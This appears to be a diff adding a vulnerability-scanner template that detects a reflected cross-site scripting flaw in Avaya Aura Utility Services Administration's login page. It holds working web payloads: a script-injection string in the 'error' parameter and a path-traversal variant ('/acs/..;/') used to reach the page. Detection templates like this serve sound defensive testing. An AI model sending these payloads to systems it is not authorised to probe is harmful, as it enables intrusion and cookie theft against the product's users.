@@ -1,0 +1,33 @@
+id: avaya-aura-xss
+name: Avaya Aura Utility Services Administration - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: Avaya Aura Utility Services Administration contains a cross-site scripting vulnerability. An attacker can inject
+  arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker
+  to steal cookie-based authentication credentials and launch other attacks.
+reference: CWE-80
+tags:
+- xss
+- avaya
+- aura
+- iot
+- vuln
+requests:
+- method: GET
+  path: /admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
+  matchers: &id001
+  - type: body
+    words:
+    - <script>alert(document.domain)</script>
+    - Avaya Aura Device Services
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
+  matchers: *id001
+  condition: and
